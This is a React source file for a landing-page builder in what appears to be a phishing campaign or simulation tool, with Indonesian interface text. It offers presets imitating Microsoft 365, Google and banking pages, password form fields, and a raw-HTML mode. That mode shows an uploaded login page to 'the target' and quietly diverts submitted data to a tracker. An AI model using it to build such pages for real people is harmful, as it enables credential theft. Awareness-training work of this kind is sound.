import { useState } from 'react';
import { HiOutlineSparkles, HiOutlineCheckCircle, HiOutlinePlus, HiOutlineTrash } from 'react-icons/hi2';
import './LandingPageBuilder.css';

const THEME_STYLES = [
  { value: 'generic', label: 'Generic / Default' },
  { value: 'microsoft365', label: 'Microsoft 365' },
  { value: 'google', label: 'Google Workspace' },
  { value: 'corporate', label: 'Corporate (Light)' },
  { value: 'corporate_dark', label: 'Corporate (Dark)' },
  { value: 'banking', label: 'Banking / Finance' },
  { value: 'raw_html', label: 'Raw HTML (Custom)' },
];

export default function LandingPageBuilder({ value, onChange, templates = [] }) {
  const [activeTab, setActiveTab] = useState(value?.theme_style === 'raw_html' ? 'raw' : (value?.theme_style === 'ai' ? 'ai' : 'custom')); // 'ai', 'custom', 'template', 'raw'
  const [selectedTemplate, setSelectedTemplate] = useState('');

  const handleFieldChange = (key, val) => {
    onChange({ ...value, [key]: val });
  };

  const handleFormFieldChange = (index, key, val) => {
    const newFields = [...(value.form_fields || [])];
    newFields[index] = { ...newFields[index], [key]: val };
    handleFieldChange('form_fields', newFields);
  };

  const addFormField = () => {
    const newFields = [...(value.form_fields || []), { name: '', label: 'New Field', type: 'text', placeholder: '' }];
    handleFieldChange('form_fields', newFields);
  };

  const removeFormField = (index) => {
    const newFields = (value.form_fields || []).filter((_, i) => i !== index);
    handleFieldChange('form_fields', newFields);
  };

  const loadTemplate = (id) => {
    const tmpl = templates.find(t => t.id === id);
    if (tmpl) {
      onChange(tmpl.config);
      setSelectedTemplate(id);
      if (tmpl.config.theme_style === 'raw_html') setActiveTab('raw');
    }
  };

  const handleFileUpload = (e) => {
    const file = e.target.files[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (evt) => {
        onChange({ ...value, raw_html: evt.target.result, theme_style: 'raw_html' });
      };
      reader.readAsText(file);
    }
  };

  return (
    <div className="lpb-container">
      <div className="lpb-tabs">
        <button 
          type="button"
          className={`lpb-tab ${activeTab === 'ai' ? 'active' : ''}`}
          onClick={() => {
            setActiveTab('ai');
            onChange({ ...value, theme_style: 'ai' });
          }}
        >
          <HiOutlineSparkles /> AI Generate
        </button>
        <button 
          type="button"
          className={`lpb-tab ${activeTab === 'custom' ? 'active' : ''}`}
          onClick={() => {
            setActiveTab('custom');
            onChange({ ...value, theme_style: value.theme_style === 'raw_html' || value.theme_style === 'ai' ? 'generic' : value.theme_style || 'generic' });
          }}
        >
          ✏️ Custom Builder
        </button>
        <button 
          type="button"
          className={`lpb-tab ${activeTab === 'template' ? 'active' : ''}`}
          onClick={() => setActiveTab('template')}
        >
          📋 From Template
        </button>
        <button 
          type="button"
          className={`lpb-tab ${activeTab === 'raw' ? 'active' : ''}`}
          onClick={() => {
            setActiveTab('raw');
            onChange({ ...value, theme_style: 'raw_html' });
          }}
        >
          💻 Raw HTML
        </button>
      </div>

      <div className="lpb-content">
        {activeTab === 'ai' && (
          <div className="lpb-ai-mode">
            <div className="lpb-ai-info">
              <HiOutlineSparkles size={32} style={{ color: 'var(--accent-primary)' }} />
              <h4>AI Landing Page Generation</h4>
              <p>
                Konfigurasi landing page akan di-generate secara otomatis oleh AI berdasarkan 
                <strong> Tema</strong> dan <strong>Tingkat Kesulitan</strong> kampanye Anda saat tombol 
                "Generate Template" ditekan di halaman utama.
              </p>
              <div className="lpb-badge-success">
                <HiOutlineCheckCircle /> Mode AI aktif
              </div>
            </div>
          </div>
        )}

        {activeTab === 'template' && (
          <div className="lpb-template-mode">
            <h4>Pilih Template</h4>
            <div className="lpb-template-list">
              {templates.length === 0 ? (
                <p className="text-muted">Belum ada template tersedia.</p>
              ) : (
                templates.map(t => (
                  <div 
                    key={t.id} 
                    className={`lpb-template-card ${selectedTemplate === t.id ? 'selected' : ''}`}
                    onClick={() => loadTemplate(t.id)}
                  >
                    <div className="lpb-template-header">
                      <h5>{t.name}</h5>
                      {t.is_default && <span className="badge badge-info">Default</span>}
                    </div>
                    <p>{t.description}</p>
                  </div>
                ))
              )}
            </div>
          </div>
        )}

        {activeTab === 'raw' && (
          <div className="lpb-raw-mode">
            <div className="lpb-editor-section">
              <h5>Upload HTML File</h5>
              <p className="text-muted" style={{ marginBottom: '16px' }}>
                Unggah file HTML mentah (misal: halaman login game) yang akan ditampilkan kepada target.
                Sistem secara ajaib akan mencegat form submit agar data masuk ke tracker tanpa mengubah desain aslinya!
              </p>
              <input type="file" accept=".html,.htm" className="input" onChange={handleFileUpload} />
              
              <div className="input-group" style={{ marginTop: '16px' }}>
                <label>HTML Source Code</label>
                <textarea 
                  className="input" 
                  rows="12" 
                  style={{ fontFamily: 'monospace', whiteSpace: 'pre' }}
                  value={value.raw_html || ''}
                  onChange={e => onChange({ ...value, raw_html: e.target.value, theme_style: 'raw_html' })}
                  placeholder="Paste HTML Anda di sini..."
                />
              </div>
            </div>
            
            <div className="lpb-preview" style={{ marginTop: '24px' }}>
              <h5>Live Preview</h5>
              <div className="lpb-preview-wrapper" style={{ height: '500px', backgroundColor: '#fff', overflow: 'hidden', padding: 0 }}>
                {value.raw_html ? (
                  <iframe 
                    title="Preview HTML"
                    srcDoc={value.raw_html} 
                    style={{ width: '100%', height: '100%', border: 'none' }} 
                  />
                ) : (
                  <div style={{ padding: '20px', color: '#999' }}>Belum ada HTML yang diupload</div>
                )}
              </div>
            </div>
          </div>
        )}

        {(activeTab === 'custom' || activeTab === 'template') && (
          <div className="lpb-custom-grid">
            {/* Editor Panel */}
            <div className="lpb-editor">
              <div className="lpb-editor-section">
                <h5>Identity & Copy</h5>
                <div className="input-group">
                  <label>Brand Name</label>
                  <input className="input" value={value.brand_name || ''} onChange={e => handleFieldChange('brand_name', e.target.value)} />
                </div>
                <div className="input-group">
                  <label>Logo Emoji</label>
                  <input className="input" value={value.logo_emoji || ''} onChange={e => handleFieldChange('logo_emoji', e.target.value)} maxLength={2} placeholder="Emoji alternatif" />
                </div>
                <div className="input-group">
                  <label>Logo Image URL (Opsional)</label>
                  <input className="input" value={value.logo_image || ''} onChange={e => handleFieldChange('logo_image', e.target.value)} placeholder="https://..." />
                </div>
                <div className="input-group">
                  <label>Title</label>
                  <input className="input" value={value.title || ''} onChange={e => handleFieldChange('title', e.target.value)} />
                </div>
                <div className="input-group">
                  <label>Subtitle</label>
                  <input className="input" value={value.subtitle || ''} onChange={e => handleFieldChange('subtitle', e.target.value)} />
                </div>
              </div>

              <div className="lpb-editor-section">
                <h5>Colors & Theme</h5>
                <div className="lpb-color-grid">
                  <div className="input-group">
                    <label>Primary</label>
                    <input type="color" className="lpb-color-input" value={value.primary_color || '#0066cc'} onChange={e => handleFieldChange('primary_color', e.target.value)} />
                  </div>
                  <div className="input-group">
                    <label>Background</label>
                    <input type="color" className="lpb-color-input" value={value.bg_color || '#f5f5f5'} onChange={e => handleFieldChange('bg_color', e.target.value)} />
                  </div>
                  <div className="input-group">
                    <label>Text</label>
                    <input type="color" className="lpb-color-input" value={value.text_color || '#1a1a1a'} onChange={e => handleFieldChange('text_color', e.target.value)} />
                  </div>
                  <div className="input-group">
                    <label>Button</label>
                    <input type="color" className="lpb-color-input" value={value.button_color || '#0066cc'} onChange={e => handleFieldChange('button_color', e.target.value)} />
                  </div>
                </div>
                <div className="input-group" style={{ marginTop: '12px' }}>
                  <label>Background Image URL (Opsional)</label>
                  <input className="input" value={value.bg_image || ''} onChange={e => handleFieldChange('bg_image', e.target.value)} placeholder="https://..." />
                </div>
                <div className="input-group" style={{ marginTop: '12px' }}>
                  <label>Theme Style</label>
                  <select className="input" value={value.theme_style || 'generic'} onChange={e => handleFieldChange('theme_style', e.target.value)}>
                    {THEME_STYLES.map(ts => <option key={ts.value} value={ts.value}>{ts.label}</option>)}
                  </select>
                </div>
                <div className="input-group" style={{ marginTop: '12px' }}>
                  <label>Custom CSS (Opsional)</label>
                  <textarea className="input" value={value.custom_css || ''} onChange={e => handleFieldChange('custom_css', e.target.value)} rows="3" placeholder=".landing-card { box-shadow: none; }" />
                </div>
              </div>

              <div className="lpb-editor-section">
                <div className="lpb-section-header">
                  <h5>Form Fields</h5>
                  <button type="button" className="btn btn-sm btn-ghost" onClick={addFormField}>
                    <HiOutlinePlus /> Add Field
                  </button>
                </div>
                <div className="lpb-fields-list">
                  {(value.form_fields || []).map((field, idx) => (
                    <div key={idx} className="lpb-field-item">
                      <div className="lpb-field-row">
                        <input className="input" placeholder="Label" value={field.label} onChange={e => handleFormFieldChange(idx, 'label', e.target.value)} />
                        <select className="input" value={field.type} onChange={e => handleFormFieldChange(idx, 'type', e.target.value)}>
                          <option value="text">Text</option>
                          <option value="email">Email</option>
                          <option value="password">Password</option>
                          <option value="number">Number</option>
                        </select>
                        <button type="button" className="btn btn-ghost lpb-btn-delete" onClick={() => removeFormField(idx)}>
                          <HiOutlineTrash />
                        </button>
                      </div>
                      <div className="lpb-field-row">
                        <input className="input" placeholder="Field Name (e.g., user_email)" value={field.name} onChange={e => handleFormFieldChange(idx, 'name', e.target.value)} />
                        <input className="input" placeholder="Placeholder text" value={field.placeholder} onChange={e => handleFormFieldChange(idx, 'placeholder', e.target.value)} />
                      </div>
                    </div>
                  ))}
                </div>
                <div className="input-group" style={{ marginTop: '16px' }}>
                  <label>Button Text</label>
                  <input className="input" value={value.button_text || 'Submit'} onChange={e => handleFieldChange('button_text', e.target.value)} />
                </div>
              </div>

              <div className="lpb-editor-section">
                <h5>Footer</h5>
                <div className="input-group">
                  <label>Footer Text</label>
                  <input className="input" value={value.footer_text || ''} onChange={e => handleFieldChange('footer_text', e.target.value)} />
                </div>
              </div>
            </div>

            {/* Preview Panel */}
            <div className="lpb-preview">
              <h5>Live Preview</h5>
              <div 
                className="lpb-preview-wrapper" 
                style={{ 
                  backgroundColor: value.bg_color || '#f5f5f5',
                  backgroundImage: value.bg_image ? `url(${value.bg_image})` : 'none',
                  backgroundSize: 'cover',
                  backgroundPosition: 'center',
                }}
              >
                <div 
                  className={`lpb-preview-card theme-${value.theme_style || 'generic'}`}
                  style={{
                    '--p-primary': value.primary_color || '#0066cc',
                    '--p-bg': value.bg_color || '#f5f5f5',
                    '--p-text': value.text_color || '#1a1a1a',
                    '--p-btn': value.button_color || '#0066cc',
                  }}
                >
                  <div className="lpb-p-logo">
                    {value.logo_image ? (
                      <img src={value.logo_image} alt="Logo" style={{ maxHeight: '48px', maxWidth: '100%' }} />
                    ) : (
                      value.logo_emoji || '🔒'
                    )}
                  </div>
                  <h1 className="lpb-p-title">{value.title || 'Title'}</h1>
                  <p className="lpb-p-subtitle">{value.subtitle || 'Subtitle'}</p>
                  
                  <div className="lpb-p-form">
                    {(value.form_fields || []).map((f, i) => (
                      <div key={i} className="lpb-p-group">
                        <label>{f.label || 'Label'}</label>
                        <input type={f.type || 'text'} placeholder={f.placeholder || ''} disabled />
                      </div>
                    ))}
                    <button className="lpb-p-btn" type="button" disabled>
                      {value.button_text || 'Submit'}
                    </button>
                  </div>
                  
                  {value.footer_text && (
                    <div className="lpb-p-footer">{value.footer_text}</div>
                  )}
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
